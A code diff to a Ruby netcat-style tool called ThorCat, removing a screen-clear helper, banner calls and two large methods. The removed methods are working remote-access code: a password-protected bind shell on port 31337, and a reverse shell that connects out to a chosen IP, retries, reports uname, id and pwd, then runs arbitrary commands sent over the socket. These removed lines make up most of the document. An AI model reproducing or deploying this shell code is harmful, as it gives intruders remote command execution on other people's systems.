@@ -26,10 +26,6 @@ h = "\033[1;77m[@] \033[0m"
 
 require 'optparse'
 
-def cls
-  system('clear')
-end
-
 def randz
   (0...1).map{ ('0'..'3').to_a[rand(4)] }.join
 end
@@ -86,112 +82,6 @@ class ThorCat
       IO.select([@socket, STDIN], [@socket, STDIN], [@socket, STDIN])
     end
   end
-
-  def bind_shell(port=31337, password='knock-knock')
-    @greetz=["Piss Off!", "Grumble, Grumble......?", "Run along now, nothing to see here.....", "Who's There?"]
-
-    Socket.tcp_server_loop("#{port}") do |socket, client_addrinfo|
-      command = socket.gets.chomp
-      if command.downcase == password
-        socket.puts "\nYou've Been Authenticated!\n"
-        socket.puts "Type 'exit' or 'quit' to exit shell & keep port listening..."
-        socket.puts "Type 'kill' or 'close' to close listenr for good!\n"
-        socket.puts "Server Info: "
-        begin
-          count=0
-          while count.to_i < 3
-            if count.to_i == 0
-              command="uname -a"
-              socket.print "BUILD: \n"
-            elsif count.to_i == 1
-              command="id"
-              socket.print "ID: "
-            elsif count.to_i == 2
-              command="pwd"
-              socket.print "PWD: "
-            end
-            count = count.to_i + 1
-            Open3.popen2e("#{command}") do | stdin, stdothers |
-              IO.copy_stream(stdothers, socket)
-            end
-          end
-          while(true)
-            socket.print "\n(ThorCat)> "
-            command = socket.gets.chomp
-            if command.downcase == 'exit' or command.downcase == 'quit'
-              socket.puts "\nGot root?\n\n"
-              break
-            end
-            if command.downcase == 'kill' or command.downcase == 'close'
-              socket.puts "\nGot root?\n\n"
-              exit
-            end
-            Open3.popen2e("#{command}") do | stdin, stdothers |
-              IO.copy_stream(stdothers, socket)
-            end
-          end
-          rescue
-            socket.write "\nCommand or file is not found!\n"
-            socket.write "Type 'exit' or 'quit' to close the session."
-            socket.write "Type 'kill' or 'close' to kill the shell completely.\n"
-            retry
-          ensure
-            @cleared=0
-            socket.close
-          end
-        else
-          num=randz
-          socket.puts @greetz[num.to_i]
-        end
-
-    end
-  end
-
-  def reverse_shell(ip='127.0.0.1', port=31337, retries='5')
-    while retries.to_i > 0
-      begin
-        socket = TCPSocket.new "#{ip}", "#{port}"
-        break
-      rescue
-        sleep 10
-        retries = retries.to_i - 1
-        retry
-      end
-    end
-    begin
-      socket.puts "Server Info:"
-      count=0
-      while count.to_i < 3
-        if count.to_i == 0
-          command="uname -a"
-          socket.print "BUILD: \n"
-        elsif count.to_i == 1
-          command="id"
-          socket.print "ID: "
-        elsif count.to_i == 2
-          command="pwd"
-          socket.print "PWD: "
-        end
-        count = count.to_i + 1
-        Open3.popen2e("#{command}") do | stdin, stdothers |
-          IO.copy_stream(stdothers, socket)
-        end
-      end
-      while(true)
-        socket.print "\n(ThorCat)> "
-        command = socket.gets.chomp
-        if command.downcase == 'exit' or command.downcase == 'quit'
-          socket.puts "\nGot root?\n\n"
-          break
-        end
-        Open3.popen2e("#{command}") do | stdin, stdothers |
-          IO.copy_stream(stdothers, socket)
-        end
-      end
-    rescue
-      retry
-    end
-  end
 end
 
 options = {}
@@ -235,16 +125,12 @@ begin
   end
   missing = mandatory.select{ |param| options[param].nil? }
   if not missing.empty?
-    cls
-    banner
     puts
     puts "Missing options: #{missing.join(', ')}"
     puts optparse
     exit 666;
   end
 rescue OptionParser::InvalidOption, OptionParser::MissingArgument
-  cls
-  banner
   puts
   puts $!.to_s
   puts
